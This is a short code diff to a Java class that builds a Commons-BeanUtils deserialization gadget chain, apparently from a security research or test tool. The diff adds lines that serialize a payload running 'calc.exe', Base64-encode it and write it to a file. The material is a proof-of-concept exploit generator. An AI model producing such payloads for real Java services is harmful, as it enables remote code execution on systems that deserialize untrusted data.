@@ -3,6 +3,9 @@ package me.n1ar4.fake.gadget;
 import org.apache.commons.beanutils.BeanComparator;
 
 import java.math.BigInteger;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
 import java.util.PriorityQueue;
 
 @SuppressWarnings("all")
@@ -32,6 +35,8 @@ public class CB {
     public static void main(String[] args) throws Exception {
         CB c = new CB();
         Object obj = c.getObject("calc.exe");
+        String base64 = Base64.getEncoder().encodeToString(SerUtil.serializeObject(obj));
+        Files.write(Paths.get("test.txt"),base64.getBytes());
         SerUtil.deserializeObject(SerUtil.serializeObject(obj));
     }
 }
